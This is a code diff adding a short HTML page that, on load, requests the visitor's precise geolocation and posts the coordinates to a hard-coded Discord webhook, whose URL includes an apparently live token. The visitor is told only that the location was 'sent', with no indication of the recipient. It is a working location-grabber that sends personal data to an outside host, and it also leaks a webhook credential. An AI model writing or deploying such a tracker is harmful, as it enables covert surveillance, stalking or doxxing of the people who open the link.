@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Send Location</title></head>
+<body>
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1393310324819755048/JfbxAgH4tTNSig5h63pYCTr-QlOrNC5-wpkzTXH7AE34AGo3U1JWjKlPEFt6fElmiX7N";
+
+function sendLocation(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+
+    const content = `Exact location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters`;
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({content})
+    })
+    .then(() => alert("Location sent!"))
+    .catch(() => alert("Failed to send location."));
+}
+
+function handleError(error) {
+    alert("Error getting location: " + error.message);
+}
+
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {enableHighAccuracy: true});
+} else {
+    alert("Geolocation not supported by this browser.");
+}
+</script>
+</body>
+</html>
